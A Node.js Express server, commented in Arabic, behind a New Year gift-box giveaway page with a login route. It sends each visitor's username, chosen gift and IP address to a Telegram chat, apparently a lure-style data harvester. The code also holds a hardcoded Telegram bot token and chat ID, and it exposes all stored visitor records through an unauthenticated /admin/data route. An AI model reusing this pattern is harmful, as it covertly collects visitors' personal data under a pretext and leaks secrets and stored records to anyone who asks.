const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// إعدادات الميدلوير
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Telegram Bot Token و Chat ID - ضع معلوماتك هنا
const TELEGRAM_BOT_TOKEN = '8602765183:AAFv3ytqUaBO06eXePOzOINmGaC3JGUdvwc';
const TELEGRAM_CHAT_ID = '5859857970';

// مسار لاستقبال البيانات من الموقع
app.post('/send-to-telegram', async (req, res) => {
    try {
        const { username, gift, boxNumber, timestamp, ip } = req.body;
        
        // رسالة التليجرام
        const message = `
🎄 *مفاجأة السنة الجديدة* 🎁

👤 *اسم المستخدم:* ${username}
🎁 *الهدية المختارة:* ${gift}
🔢 *رقم الصندوق:* ${boxNumber}
⏰ *الوقت:* ${new Date(timestamp).toLocaleString('ar-EG')}
🌐 *عنوان IP:* ${ip}

✅ تم اختيار الهدية بنجاح!
        `;
        
        // إرسال الرسالة إلى التليجرام
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }
        );
        
        console.log('تم إرسال الرسالة إلى التليجرام');
        
        // حفظ البيانات في ملف (اختياري)
        saveToFile({
            username,
            gift,
            boxNumber,
            timestamp,
            ip,
            telegramResponse: telegramResponse.data
        });
        
        res.json({ 
            success: true, 
            message: 'تم إرسال البيانات إلى التليجرام بنجاح' 
        });
        
    } catch (error) {
        console.error('خطأ في إرسال البيانات:', error);
        res.status(500).json({ 
            success: false, 
            message: 'خطأ في إرسال البيانات' 
        });
    }
});

// مسار لعرض البيانات المحفوظة (للإدارة)
app.get('/admin/data', (req, res) => {
    const fs = require('fs');
    try {
        const data = fs.readFileSync('data.json', 'utf8');
        const jsonData = JSON.parse(data);
        res.json(jsonData);
    } catch (error) {
        res.json([]);
    }
});

// مسار رئيسي
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});

// دالة لحفظ البيانات في ملف
function saveToFile(data) {
    const fs = require('fs');
    const path = require('path');
    
    const filePath = path.join(__dirname, 'data.json');
    let existingData = [];
    
    try {
        const fileData = fs.readFileSync(filePath, 'utf8');
        existingData = JSON.parse(fileData);
    } catch (error) {
        // إذا الملف مش موجود، نبدأ بمصفوفة فارغة
    }
    
    existingData.push({
        ...data,
        savedAt: new Date().toISOString()
    });
    
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));
}

// تشغيل السيرفر
app.listen(PORT, () => {
    console.log(`✅ السيرفر يعمل على http://localhost:${PORT}`);
    console.log(`📱 أرسل البيانات إلى: http://localhost:${PORT}/send-to-telegram`);
});
